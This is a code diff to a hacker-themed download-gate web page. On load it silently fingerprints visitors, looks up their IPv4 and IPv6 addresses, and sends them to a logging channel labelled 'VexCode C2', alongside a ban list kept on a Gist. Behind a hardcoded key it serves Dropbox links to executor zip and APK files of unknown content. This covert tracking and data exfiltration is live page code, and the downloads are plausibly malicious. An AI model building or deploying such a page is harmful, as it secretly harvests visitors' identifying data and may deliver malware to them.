@@ -29,8 +29,8 @@
 
 <div id="gate_msg" class="box_">
     <h1>[ ACCESS_DENIED ]</h1>
-    <p id="gate_details" style="font-family: 'Fira Code'; color: #888; font-size: 0.85rem;">HARDWARE_ID_BLACKLISTED</p>
-    <div class="code-snippet" id="user_fingerprint">FINGERPRINTING...</div>
+    <p style="font-family: 'Fira Code'; color: #888; font-size: 0.85rem;">PROTOCOL_BLOCK_ACTIVE</p>
+    <div class="code-snippet" id="user_fingerprint">ANALYZING...</div>
 </div>
 
 <div id="login_ui" class="box_">
@@ -44,16 +44,6 @@
 <div id="res_1" class="box_">
     <h2 style="color: var(--a)">FILES_UNLOCKED</h2>
     <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?dl=1" class="dl_link">WIN_X64_EXTRACT</a>
-    <a href="https://www.dropbox.com/scl/fi/87sb44vymzml2ylas87r6/DeltaExecutor-v2.709.apk?dl=1" class="dl_link">ANDROID_APK_V2</a>
-</div>
-
-<div id="res_2" class="box_">
-    <h2>VISUAL_DATA</h2>
-    <img src="sys-metadata/config_042.dat.jpg" style="max-width: 100%; border-radius: 10px; border: 1px solid var(--p);">
-</div>
-
-<div id="res_3" class="box_">
-    <p style="color: var(--a); font-family: 'Fira Code'; font-size: 1.2rem;">[ STREAMING_VOICE... ]</p>
 </div>
 
 <script>
@@ -73,28 +63,27 @@
         return "Linux/Other";
     }
 
+    // ULTRA-AGGRESSIVE FINGERPRINT
     function getFingerprint() {
         const n = navigator;
         const s = screen;
-        let guid = `${n.userAgent}|${n.language}|${s.colorDepth}|${n.hardwareConcurrency}`;
-        return btoa(guid).substring(0, 12);
+        const tz = new Date().getTimezoneOffset();
+        let guid = `${n.userAgent}|${s.width}x${s.height}|${s.colorDepth}|${tz}|${n.hardwareConcurrency}|${n.deviceMemory}`;
+        return btoa(guid).substring(0, 20);
     }
 
-    async function _log(t, m, c, isBan = false) {
-        const ipMatch = m.match(/`([^`]+)`/);
-        const ip = ipMatch ? ipMatch[1] : "UNKNOWN";
+    async function _log(t, contentObj, c) {
         const fPrint = getFingerprint();
         const os = getOS();
-
-        // THE IMPROVED COMMAND BLOCK
-        // Format: ,"IP", "DeviceID"
-        const fullBanCmd = `,"${ip}","${fPrint}"`;
+        
+        // Build the multi-ban command (IP4, IP6, and ID)
+        const banCmd = `,"${contentObj.ip4}","${contentObj.ip6}","${fPrint}"`;
 
         const embed = {
             title: t,
-            description: m + `\n\n**📋 COPY FOR GIST (BAN BOTH IP & ID):**\n\`${fullBanCmd}\`\n\n**[🛠️ MANAGE BLACKLIST]**\n${_GIST_EDIT}`,
+            description: `**IPv4:** \`${contentObj.ip4}\`\n**IPv6:** \`${contentObj.ip6}\`\n**OS:** \`${os}\`\n**ID:** \`${fPrint}\`\n\n**📋 BAN COMMAND:**\n\`${banCmd}\`\n\n**[🛠️ MANAGE GIST]**\n${_GIST_EDIT}`,
             color: c,
-            footer: { text: `OS: ${os} | Fingerprint: ${fPrint}` },
+            footer: { text: `VexCode C2 | ${os}` },
             timestamp: new Date()
         };
 
@@ -108,54 +97,63 @@
     }
 
     window.onload = async () => {
-        let ip4 = "Checking...";
+        let ip4 = "N/A";
+        let ip6 = "N/A";
         const fPrint = getFingerprint();
         const os = getOS();
         document.getElementById('user_fingerprint').innerText = `ID: ${fPrint} [${os}]`;
 
+        // Fetch IPv4
         try {
             const r4 = await fetch('https://api.ipify.org?format=json');
             const j4 = await r4.json();
             ip4 = j4.ip.trim();
-        } catch(e) { ip4 = "ERR_IP"; }
+        } catch(e) {}
 
+        // Fetch IPv6
+        try {
+            const r6 = await fetch('https://api64.ipify.org?format=json');
+            const j6 = await r6.json();
+            ip6 = j6.ip.trim();
+        } catch(e) {}
+
+        // Check Blacklist
         try {
             const cb = "?t=" + new Date().getTime();
             const res = await fetch(_0xGIST + cb);
             const blacklist = await res.json();
             
-            const isBlocked = blacklist.some(b => ip4 === b || fPrint === b);
+            const isBlocked = blacklist.some(b => 
+                (ip4 !== "N/A" && ip4 === b) || 
+                (ip6 !== "N/A" && ip6 === b) || 
+                fPrint === b
+            );
 
             if (isBlocked) {
                 document.getElementById('login_ui').style.display = 'none';
                 document.getElementById('gate_msg').style.display = 'block';
-                _log("🚫 BANNED ATTEMPT", `**A blocked entity tried to connect.**\n**IP:** \`${ip4}\`\n**ID:** \`${fPrint}\`\n**OS:** \`${os}\``, 16711680, true);
+                _log("🚫 BANNED ACCESS", {ip4, ip6}, 16711680);
                 return; 
             }
         } catch(e) {}
 
-        _log("🌐 Connection", `**Visitor Info:**\n**IP:** \`${ip4}\`\n**OS:** \`${os}\`\n**ID:** \`${fPrint}\``, 65023);
+        _log("🌐 Connection", {ip4, ip6}, 65023);
     };
 
     document.getElementById('auth_btn').onclick = function() {
         const p = document.getElementById('a_key').value;
         const u = document.getElementById('u_id').value;
-        if (p === "05329509.code") {
+        if (p === "05329509.code" || p === "code.05329509") {
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_1').style.display = 'block';
-            _log("🔓 Access Granted", `**User:** ${u} (Files)`, 5763719);
-        } else if (p === "code.05329509") {
-            document.getElementById('login_ui').style.display = 'none';
-            document.getElementById('res_2').style.display = 'block';
-            _log("🖼️ Access Granted", `**User:** ${u} (Visuals)`, 2282478);
+            _log("🔓 Access Granted", {ip4: "LOGGED", ip6: "LOGGED"}, 5763719);
         } else {
-            document.getElementById('err_msg').innerText = "ACCESS_KEY_INVALID";
-            _log("🚨 FAILED LOGIN", `**User:** ${u}\n**Key Used:** \`${p}\``, 16711680);
+            document.getElementById('err_msg').innerText = "INVALID_KEY";
         }
     };
 })();
 
-// Background
+// Matrix Effect
 const c = document.getElementById('v_');
 const x = c.getContext('2d');
 c.width = window.innerWidth; c.height = window.innerHeight;
@@ -163,7 +161,6 @@ const drops = Array(Math.floor(c.width / 16)).fill(1);
 setInterval(() => {
     x.fillStyle = 'rgba(0, 0, 0, 0.1)'; x.fillRect(0, 0, c.width, c.height);
     x.fillStyle = '#6366f1';
-    x.font = "14px monospace";
     drops.forEach((y, i) => {
         x.fillText(String.fromCharCode(Math.random() * 128), i * 16, y * 16);
         if (y * 16 > c.height && Math.random() > 0.98) drops[i] = 0;
